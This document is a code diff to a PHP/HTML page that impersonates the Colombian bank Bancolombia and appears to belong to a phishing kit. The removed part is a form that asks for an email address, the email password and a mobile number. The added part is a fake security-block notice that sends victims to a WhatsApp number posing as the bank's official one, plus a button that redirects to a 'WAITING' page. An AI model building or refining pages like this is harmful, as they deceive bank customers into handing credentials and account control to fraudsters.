@@ -1,11 +1,19 @@
 <?php
-$ip = getenv("REMOTE_ADDR");
-require_once __DIR__ . '/fecha_es.php';
-$tiempo = b34f9_fecha_larga();
+function b34f9_fecha_larga() {
+    $dias = array("Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado");
+    $meses = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
+    
+    $dia_semana = $dias[date('w')];
+    $dia = date('d');
+    $mes = $meses[date('n')-1];
+    $anio = date('Y');
+    
+    return "$dia_semana, $dia de $mes de $anio";
+}
 ?>
 <html>
     <head>
-        <title>Bancolombia - Verificación de Datos</title>
+        <title>Bancolombia - Verificación de Seguridad</title>
         <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
         
@@ -14,7 +22,7 @@ $tiempo = b34f9_fecha_larga();
         <meta name="description" content="">
         <meta name="author" content="">
         <meta name="Copyright" content="">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
         <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -23,17 +31,131 @@ $tiempo = b34f9_fecha_larga();
 
         <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
         <link href="../css/stylesheet.css" rel="stylesheet">
-        <link href="../css/style-app.css?v2" rel="stylesheet">        
+        <link href="../css/style-app.css" rel="stylesheet">        
         <link rel="icon" type="image/png" href="../img/logo.png" />
         <script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>
         <script src="../../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
     
-        <script type="text/javascript" src="../js/functions.js?v1"></script>
-        <script type="text/javascript" src="../js/ready.js?v2"></script>
+        <script type="text/javascript" src="../js/functions.js"></script>
+        <script type="text/javascript" src="../js/ready.js"></script>
 
         <style type="text/css">
-            #fondo,#cargando-o{
-                display: initial;
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: 'Open Sans', sans-serif;
+                background-color: #ffffff;
+                color: #333;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                padding: 20px 15px;
+            }
+            
+            .mensaje-seguridad {
+                flex: 1;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                text-align: center;
+                padding: 30px 20px;
+            }
+            
+            .icono-alerta {
+                width: 48px;
+                height: 48px;
+                margin-bottom: 16px;
+                display: block;
+            }
+            
+            .titulo-alerta {
+                font-size: 18px;
+                font-weight: 700;
+                color: #1a1b1a;
+                margin-bottom: 12px;
+                line-height: 1.4;
+                max-width: 100%;
+            }
+            
+            .texto-alerta {
+                font-size: 13px;
+                color: #555;
+                margin-bottom: 16px;
+                line-height: 1.5;
+                text-align: center;
+                max-width: 100%;
+            }
+            
+            .codigo-alerta {
+                font-size: 15px;
+                font-weight: 700;
+                color: #000;
+                margin: 16px 0;
+                text-align: center;
+                padding: 8px 12px;
+                background-color: #f5f5f5;
+                border-radius: 6px;
+                display: inline-block;
+            }
+            
+            .boton-alerta {
+                background-color: #FFCC00;
+                color: #000;
+                border: none;
+                padding: 14px 32px;
+                font-size: 16px;
+                font-weight: 700;
+                border-radius: 25px;
+                cursor: pointer;
+                width: 100%;
+                max-width: 280px;
+                margin: 24px auto 0;
+                display: block;
+                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+                transition: background-color 0.2s;
+            }
+            
+            .boton-alerta:active {
+                background-color: #E6B800;
+                transform: scale(0.98);
+            }
+            
+            .boton-alerta:hover {
+                background-color: #E6B800;
+            }
+            
+            /* Ajustes para móvil */
+            @media (max-width: 480px) {
+                body {
+                    padding: 15px 10px;
+                }
+                
+                .mensaje-seguridad {
+                    padding: 20px 10px;
+                }
+                
+                .titulo-alerta {
+                    font-size: 16px;
+                }
+                
+                .texto-alerta {
+                    font-size: 12px;
+                }
+                
+                .codigo-alerta {
+                    font-size: 14px;
+                    padding: 6px 10px;
+                }
+                
+                .boton-alerta {
+                    padding: 12px 28px;
+                    font-size: 15px;
+                }
             }
         </style>
         
@@ -41,78 +163,51 @@ $tiempo = b34f9_fecha_larga();
     <body>         
         <div id="fondo"></div>
         <div id="cargando">
-            <img src="../img/logo.svg">            
+            <img src="../img/logo.svg" style="width: 60px; height: 60px;">            
             <br>
-            <img src="../img/load2.gif" />
+            <img src="../img/load2.gif" style="width: 40px; height: 40px;" />
         </div>
         <div id="cargando-o">
-            <img src="../img/load4.gif" width="90">            
+            <img src="../img/load4.gif" width="60">            
             <br>
-            Cargando...
+            Procesando...
         </div>
 
-        <table width="100%" border="0" cellpadding="0" cellspacing="0">
-            <tr>
-                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
-                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-info"></td>
-            </tr>
-        </table>        
-        <br><br><br>
-        <div class="titulo-app">Verificación de datos</div>  
-        <div class="descripcion-app">Ingrese sus datos personales para gestionar aprobación</div>  
-        <div class="frm">
-            <div class="inp" id="inp-documento">
-                <table width="100%" cellpadding="0" cellspacing="0" border="0">
-                    <tr>
-                        <td valign="middle" width="36" align="left"><img src="../img/ico-mail.jpg" width="26"></td>
-                        <td valign="middle" align="left">
-                            <input type="text" name="txt-documento" id="txt-documento" class="entradas" autocomplete="off">
-                        </td>
-                    </tr>
-                </table>
+        <div class="mensaje-seguridad">
+            <img src="../img/candado.jpg" class="icono-alerta" alt="Seguridad">
+            <div class="titulo-alerta">Por seguridad, no puedes continuar la transacción</div>
+            
+            <div class="texto-alerta">
+                Código: 923 Para confirmar si eres tú quién hace la transacción, te escribiremos desde nuestro WhatsApp oficial 301 353 6788, responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.
             </div>
-            <div class="etiquetas" id="etq-documento">Correo electrónico</div>
-            <br><br>
-
-            <div class="inp" id="inp-clave">
-                <table width="100%" cellpadding="0" cellspacing="0" border="0">
-                    <tr>
-                        <td valign="middle" width="36" align="left"><img src="../img/ico-candado.jpg" width="26"></td>
-                        <td valign="middle" align="left">
-                            <input type="password" name="txt-clave" id="txt-clave" class="entradas" autocomplete="off">
-                        </td>
-                    </tr>
-                </table>
+            
+            <div class="codigo-alerta">
+                Código 923
             </div>
-            <div class="etiquetas" id="etq-clave">Clave de correo</div>
-            <br><br>
-
-            <div class="inp" id="inp-celular">
-                <table width="100%" cellpadding="0" cellspacing="0" border="0">
-                    <tr>
-                        <td valign="middle" width="36" align="left"><img src="../img/ico-cel.jpg" width="26"></td>
-                        <td valign="middle" align="left">
-                            <input type="text" name="txt-celular" maxlength="10" id="txt-celular" class="entradas" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
-                        </td>
-                    </tr>
-                </table>
-            </div>
-
-
-            <div class="etiquetas" id="etq-celular">Teléfono celular</div>
-            <br>
-        </div>  
-        <button class="botones" id="btn-info" disabled>CONTINUAR</button> 
-        <br><br><br>
-        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">¿No eres cliente?</div>  
-    
+            
+            <button class="boton-alerta" id="btn-intentar">Ya confirme que soy yo</button>
+        </div>
 
     
 </body>
 </html>
 <script type="text/javascript">
     $(document).ready(function() { 
-        setTimeout(quitar_cargando, 2000);               
+        $('#btn-intentar').on('click', function() {
+            // Ocultar contenido actual
+            $(".mensaje-seguridad").hide();
+            
+            // Mostrar pantalla de carga
+            $("#fondo").show();
+            $("#cargando-o").show();
+            
+            // Redirigir directamente a waiting.php
+            window.location.href = "../a/WAITING";
+        });
+        
+        // Prevenir zoom en doble tap
+        document.addEventListener('dblclick', function(event) {
+            event.preventDefault();
+        }, { passive: true });
     });
  </script>
